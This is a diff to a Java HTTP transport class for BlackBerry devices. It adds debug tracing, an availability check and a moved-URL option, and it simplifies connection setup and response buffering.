@@ -15,7 +15,6 @@ import java.io.OutputStream;
 
 import javax.microedition.io.Connector;
 import javax.microedition.io.HttpConnection;
-import javax.microedition.io.StreamConnection;
 
 import net.rim.device.api.io.IOCancelledException;
 import net.rim.device.api.io.http.HttpProtocolConstants;
@@ -31,7 +30,7 @@ public abstract class HttpTransport extends Transport {
 
     //#ifdef DEBUG
     private static Debug debug = new Debug("HttpTransport",
-            DebugLevel.INFORMATION);
+            DebugLevel.VERBOSE);
     //#endif
 
     String host;
@@ -56,10 +55,15 @@ public abstract class HttpTransport extends Transport {
 
     //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
     protected final String CONTENT_TYPE = "application/octet-stream";
-    static//private static String CONTENTTYPE_TEXTHTML = "text/html";
-    boolean acceptWifi = false;
+   
 
     public void start() {
+        //#ifdef FOLLOW_MOVED_URLS
+        follow_moved = true;
+        //#else
+        follow_moved = false;
+        //#endif
+
         cookie = null;
     }
 
@@ -68,11 +72,25 @@ public abstract class HttpTransport extends Transport {
     }
 
     public synchronized byte[] command(byte[] data) throws TransportException {
+        boolean available = isAvailable();
+        //#ifdef DEBUG
+        debug.trace("command, available: " + available);
+        //#endif
+        
+        if(!available){
+            throw new TransportException(20);
+        }
 
         // sending request
         HttpConnection connection = null;
         try {
+            //#ifdef DEBUG
+            debug.trace("command: creating request");
+            //#endif
             connection = createRequest();
+            //#ifdef DEBUG
+            debug.trace("command: sending request");
+            //#endif
             sendHttpPostRequest(connection, data);
         } catch (TransportException ex) {
             //#ifdef DEBUG
@@ -88,6 +106,9 @@ public abstract class HttpTransport extends Transport {
 
         int status;
         try {
+          //#ifdef DEBUG
+            debug.trace("command: get response");
+            //#endif
             status = connection.getResponseCode();
 
             // if it's moved, try with the new url
@@ -106,12 +127,14 @@ public abstract class HttpTransport extends Transport {
 
             // check response, if ok parse it            
             if (status == HttpConnection.HTTP_OK) {
+              //#ifdef DEBUG
+                debug.trace("command: parse response");
+                //#endif
                 byte[] content = parseHttpConnection(connection);
                 //#ifdef DEBUG
                 Status.getInstance().wap2Ok();
                 //#endif
                 return content;
-
             } else {
                 //#ifdef DEBUG
                 debug.error("command response status: " + status);
@@ -148,9 +171,13 @@ public abstract class HttpTransport extends Transport {
         HttpConnection httpConn = null;
 
         try {
-            StreamConnection s = null;
-            s = (StreamConnection) Connector.open(getUrl());
-            httpConn = (HttpConnection) s;
+           
+            // qui sembra bloccarsi, certe volte, con wifi.
+            httpConn = (HttpConnection) Connector.open(getUrl());
+            
+            //#ifdef DEBUG
+            debug.trace("createRequest: setting POST");
+            //#endif
             httpConn.setRequestMethod(HttpConnection.POST);
 
             if (cookie != null) {
@@ -159,6 +186,10 @@ public abstract class HttpTransport extends Transport {
                 //#endif
                 httpConn.setRequestProperty(
                         HttpProtocolConstants.HEADER_COOKIE, cookie);
+            } else{
+                //#ifdef DEBUG
+                debug.trace("createRequest: no cookie");
+                //#endif
             }
 
             httpConn.setRequestProperty(HttpProtocolConstants.HEADER_HOST,
@@ -276,7 +307,7 @@ public abstract class HttpTransport extends Transport {
             InputStream input = httpConn.openInputStream();
 
             // buffer data
-            byte[] buffer = new byte[10 * 1024];
+            byte[] buffer = new byte[1024];
             byte[] content = new byte[totalLen];
             int size = 0; // incremental size
             int len = 0; // iterative size
@@ -299,7 +330,8 @@ public abstract class HttpTransport extends Transport {
                 Utils.copy(content, size, buffer, 0, len);
                 size += len;
             }
-
+            buffer=null;
+            
             //#ifdef DEBUG
             debug.trace("parseHttpConnection received:" + size);
             //#endif
